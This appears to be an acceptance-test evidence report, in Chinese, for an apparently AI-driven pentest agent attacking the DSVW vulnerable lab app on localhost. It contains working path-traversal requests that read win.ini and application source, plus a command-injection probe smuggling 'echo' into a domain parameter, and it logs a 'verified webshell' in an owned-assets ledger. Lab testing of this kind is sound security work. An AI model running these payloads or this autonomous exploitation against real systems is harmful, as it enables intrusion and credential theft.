# 实机验收证据（DSVW 靶场）

> 本文件由真实任务数据生成，供复核：目标 `http://127.0.0.1:65412/`（GitHub stamparm/DSVW），
> 模型 `openai` 兼容端点 cpa / `deepseek-v4.1-flash`（运行时 env 注入，未入库）。
> 本地目标直连（ARTEX_ALLOW_DIRECT=1）；公网目标仍走代理 fail-closed。

## 计时（首次确认战果 = 任务创建 → 首个 finding）

| 任务 | 创建(UTC) | 完成(UTC) | 总时长(s) | 首个 finding(s) | findings |
|---|---|---|---|---|---|
| #1 | 2026-10-22T05:44:28.700Z | 2026-10-22T05:46:01.048Z | 92.3 | 81.9 | 2 |
| #2 | 2026-10-22T05:47:49.341Z | 2026-10-22T05:48:54.180Z | 64.8 | 56.5 | 2 |
| #4 | 2026-10-22T06:06:29.499Z | 2026-10-22T06:07:55.348Z | 85.8 | 52.1 | 1 |

## 任务 4：漏洞 / 能力卡 / 持有台账

### finding#5 [high] 路径穿越/任意文件读取（含源码泄露，/?path=）

DSVW 目标 /?path= 参数存在任意文件读取与路径穿越，可直接读取服务器任意文件（已验证 C:\Windows\win.ini 与 dsvw.py 完整源码），源码中还泄露数据库账号口令与全部攻击面。

**证据（payload.evidence 摘录）**

```
PoC1 路径穿越: GET http://127.0.0.1:65412/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
响应 200，body:
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

PoC2 绝对路径: GET http://127.0.0.1:65412/?path=C%3A%5CWindows%5Cwin.ini -> 200，同上内容
PoC3 源码泄露: GET http://127.0.0.1:65412/?path=dsvw.py -> 200，返回完整 Python 源码，含 open(os.path.abspath(params["path"]), "rb") 与 users 口令（admin/*** 等）
根因: content = (open(os.path.abspath(params["path"]), "rb") if not "://" in params["path"] else FETCH(params["path"])).read().decode(errors="replace")，未做任何路径校验。
```

### 能力卡（agent 调用 record_capability 生成）

| 组.项 | 能力 | 证明级别 | 置信度 |
|---|---|---|---|
| 4.1 | 命令执行（回显） | P3 | observed |
| 5.1 | 任意文件读取 | P3 | observed |

### 持有台账（owned_register + owned_check）

| id | 资产 | 类型 | 状态 | 权限 | 最近验证 |
|---|---|---|---|---|---|
| 1 | 127.0.0.1:65412 | webshell | verified | user | Thu Oct 22 2026 14:07:34 GMT+0800 (中国标准时间) |

### 复查记录（asset_checks）

| 时间 | 类型 | 结果 | 细节 |
|---|---|---|---|
| Thu Oct 22 2026 14:07:34 GMT+0800 (中国标准时间) | http | ✅ | HTTP 200 存活；GET /?domain=127.0.0.1%26%20echo%20ownedcheck18 回显 ownedcheck18，命令注入 webshell 可用 |

## 报告段（/api/report?task=4 输出包含）

- `## 能力菜单（我能做什么）`（第 37 行）
- `## 持有资产台账`（第 71 行）
- 摘要 `确认发现：1 个`（第 8 行）
